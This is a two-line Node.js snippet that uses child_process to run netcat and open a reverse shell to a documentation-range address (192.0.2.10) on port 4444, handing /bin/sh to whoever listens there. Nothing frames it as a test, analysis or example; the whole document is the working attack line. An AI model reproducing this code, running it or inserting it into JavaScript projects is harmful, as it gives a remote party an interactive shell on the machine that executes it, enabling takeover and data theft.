const { exec } = require('child_process');
exec('bash -c "nc 192.0.2.10 4444 -e /bin/sh"');
